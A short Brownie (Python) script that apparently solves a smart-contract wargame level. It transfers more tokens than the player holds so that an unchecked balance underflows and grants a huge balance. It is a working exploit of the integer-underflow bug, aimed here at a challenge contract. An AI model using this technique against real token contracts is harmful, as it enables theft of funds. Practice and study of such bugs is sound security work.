from brownie import Token, network, config,accounts

def main():
    #input the contract address
    #> contract.address

    contractAddress = '0xd6860e7ecC7A1Cf5E2a150Db4C84Ea41F6840038'

    #use player account
    player = accounts.add(config["wallets"]["from_key"])

    contract = Token.at(contractAddress)

    print("player balance is: " + str(contract.balanceOf(player)))
    #the player has 20 tokens
    print("transfer 21 tokens to contract address to cause underflow")
    contract.transfer(contract.address,21,{"from":player})
    print("player balance is: " + str(contract.balanceOf(player)))
